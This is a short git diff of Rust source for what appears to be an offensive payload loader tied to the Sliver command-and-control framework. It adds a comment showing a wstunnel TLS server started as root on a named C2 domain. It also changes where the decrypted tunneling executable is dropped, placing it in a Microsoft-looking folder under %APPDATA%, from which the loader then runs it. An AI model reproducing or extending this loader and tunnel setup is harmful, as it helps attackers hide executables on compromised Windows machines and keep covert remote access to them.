@@ -177,6 +177,8 @@ exec(decoded_script)
         // cargo run --bin conf wstunnel --payload-dataop ~/.malleable/payload/wstunnel.exe.dataop
         // cp ~/.malleable/payload/wstunnel.exe.aead ../config/mem1
         // winrust loader --mem1 --debug
+        // root@sliver:~# ./wstunnel server --tls-certificate /etc/letsencrypt/live/sliverperso.kaboum.xyz/fullchain.pem --tls-private-key /etc/letsencrypt/live/sliverperso.kaboum.xyz/privkey.pem wss://[::]:8080
+
         info!("[+] Loader type choice: WriteFile Wstunnel from memory [AEAD]");
         let payload_dataoperation: Vec<DataOperation> =
             serde_json::from_slice(&fs::read(&payload_dataope).unwrap()).unwrap();
@@ -202,7 +204,7 @@ exec(decoded_script)
             jitt:0,
             sleep:0
         }),
-        path: "${APPDATA}\\Microsoft\\wstunn3\\wstunnel.exe".to_string() }),
+        path: "${APPDATA}\\Microsoft\\wstunn3\\local_mtls_1080.exe".to_string() }),
         Payload::Exec(Exec {
             path: String::from("${APPDATA}\\Microsoft\\wstunn3\\local_mtls_1080.exe"),
             cmdline:String::from(""),
